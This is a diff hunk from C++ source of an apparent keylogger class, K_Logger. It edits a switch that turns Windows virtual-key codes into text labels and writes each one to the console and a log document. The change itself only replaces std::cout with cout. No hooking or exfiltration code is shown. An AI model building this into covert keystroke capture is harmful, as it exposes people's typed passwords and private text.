@@ -680,88 +680,88 @@ int K_Logger::SaveSymbol(WORD iKey)
 
 
 	case VK_LWIN:
-		std::cout << "Left_Win";
+		cout << "Left_Win";
 		WriteToDoc("Left_Win");
 		break;
 
 
 	case VK_SPACE:
-		std::cout << " ";
+		cout << " ";
 		WriteToDoc(" ");
 		break;
 
 	case VK_TAB:
-		std::cout << " *TAB* ";
+		cout << " *TAB* ";
 		WriteToDoc(" *TAB* ");
 		break;
 
 	case VK_MBUTTON:
-		std::cout << "  *mouse_middle-button*  ";
+		cout << "  *mouse_middle-button*  ";
 		WriteToDoc("  *mouse_middle-button*  ");
 		break;
 
 	case VK_MENU:
-		std::cout << "  *Left_ALT*  ";
+		cout << "  *Left_ALT*  ";
 		WriteToDoc("  *Left_ALT*  ");
 		break;
 
 	case VK_SNAPSHOT:
-		std::cout << "  *PRINT_SCREEN*  ";
+		cout << "  *PRINT_SCREEN*  ";
 		WriteToDoc("  *PRINT_SCREEN*  ");
 		break;
 
 	case VK_CAPITAL:
-		std::cout << "  *CAPS_LOCK*  ";
+		cout << "  *CAPS_LOCK*  ";
 		WriteToDoc("  *CAPS_LOCK*  ");
 		break;
 
 	case VK_RETURN:
-		std::cout << "\n";
+		cout << "\n";
 		WriteToDoc("\n");
 		break;
 
 	case VK_SHIFT:
-		std::cout << " *Left_Shift* ";
+		cout << " *Left_Shift* ";
 		WriteToDoc(" *Left_Shift* ");
 		break;
 
 	case VK_RSHIFT:
-		std::cout << " *Right_Shift* ";
+		cout << " *Right_Shift* ";
 		WriteToDoc(" *Right_Shift* ");
 		break;
 
 	case VK_BACK:
-		std::cout << "\b";
+		cout << "\b";
 		WriteToDoc("\b");
 		break;
 
 	case VK_PRIOR:
-		std::cout << "  *PageUp*  ";
+		cout << "  *PageUp*  ";
 		WriteToDoc("  *PageUp*  ");
 		break;
 
 	case VK_NEXT:
-		std::cout << "  *PageDown*  ";
+		cout << "  *PageDown*  ";
 		WriteToDoc("  *PageDown*  ");
 		break;
 
 	case VK_ESCAPE:
-		std::cout << " *Esc* ";
+		cout << " *Esc* ";
 		WriteToDoc(" *Esc* ");
 		break;
 
 	case VK_UP:
-		std::cout << " btn_up ";
+		cout << " btn_up ";
 		WriteToDoc(" btn_up ");
 		break;
 
 	case VK_DOWN:
-		std::cout << " btn_down ";
+		cout << " btn_down ";
 		WriteToDoc(" btn_down ");
 		break;
 
 	case VK_LEFT:
-		std::cout << " btn_left ";
+		cout << " btn_left ";
 		WriteToDoc(" btn_left ");
 		break;
 
